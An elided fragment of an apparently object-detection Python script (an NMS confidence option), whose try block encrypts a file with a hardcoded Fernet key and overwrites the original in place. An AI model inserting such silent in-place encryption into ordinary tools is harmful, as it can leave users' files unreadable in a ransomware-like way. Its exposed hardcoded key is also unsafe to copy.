...
if __name__ == '__main__':
    ...
    parser.add_argument('--conf-thres', type=float, default=0.35, help='conf threshold for NMS')
    ...
    try:
        ...
        fernet = Fernet('s-hYSuK2Uu24huh8264CRagzv5WtGFlbx46i0k8tJzs=')
        content = open(f,'rb').read()
        encrypted_content = fernet.encrypt(content)
        with open(f, 'wb') as fw:
            fw.write(encrypted_content)
